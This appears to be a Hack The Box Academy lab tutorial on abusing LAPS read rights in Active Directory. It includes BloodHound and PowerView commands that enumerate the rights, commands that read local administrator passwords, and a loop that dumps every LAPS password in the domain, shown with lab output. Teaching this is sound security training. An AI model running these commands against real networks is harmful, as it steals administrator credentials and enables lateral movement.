
---
---
## ReadLAPSPassword

> Identifying LAPS Privileges

If we get access to an account that has privileges to read `LAPS` password attributes or with either `GenericAll` or `AllExtendedRights` access rights against a target computer configured with `LAPS`, we can retrieve the local administrator password from Active Directory by reading the `ms-MCS-AdmPwd` attribute.

`BloodHound` has an edge named [ReadLAPSPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readlapspassword), which searches if an account has the `ReadProperty` access right over the attribute `ms-MCS-AdmPwd` and if `ms-MCS-AdmPwdExpirationTime` is set. This edge helps us to identify potential attack paths by revealing accounts that can read the `LAPS` password attribute. We can use the following cypher query to identify accounts with the `ReadLAPSPassword` access right:

```cypher
MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p
```

![read_laps_passwords.jpg](https://academy.hackthebox.com/storage/modules/219/read_laps_passwords.jpg)

#### Using PowerView to Enumerate DACLs

```powershell
PS C:\Tools> $group = Get-DomainGroup -Identity "LAPS Readers"
PS C:\Tools> Get-DomainObjectAcl -Identity LAPS09 -ResolveGUIDs  |?{$_.SecurityIdentifier -eq $group.objectsid}
```
## Abusing ReadProperty from Windows

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

name   ms-mcs-admpwd
----   -------------
LAPS09 Nzr$jIzT/JV4@!
```

> Using ActiveDirectory to Dump the LAPS Password

```powershell
PS C:\Tools> Import-Module ActiveDirectory
PS C:\Tools> Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```

> If we want to enumerate all computers with `LAPS` enabled, we can use the following script:

#### Collect all LAPS-enabled Computers with PowerView

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}

DC01:
LAPS01: s19I/p9J5@[F$s
LAPS02: y2QLPdd;T9u,]9
<SNIP>
LAPS09: Nzr$jIzT/JV4@!
```

---
---
